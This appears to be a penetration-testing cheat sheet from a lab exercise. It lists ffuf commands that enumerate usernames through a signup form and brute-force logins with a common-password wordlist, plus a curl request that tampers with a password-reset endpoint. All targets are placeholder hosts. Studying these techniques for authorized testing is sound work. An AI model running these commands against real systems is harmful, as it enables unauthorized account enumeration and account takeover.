
### Fuzzing

- Username enumeration 
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [http://IP_ADDRESS/customers/signup](http://IP_ADDRESS/customers/signup) -mr "username already exists"
# mr = match response content
# w = wordlists 
# default attack method is clusterbomb, set attack mith -mode flag
```
- username-password bruteforcing
```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -mc 200
# mathing for 200 response codes 
```
- curl POST request
```bash
curl -v -X POST 'http://URL/Customers/reset?email=USER1&' \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=szvvo&email={username}"
```
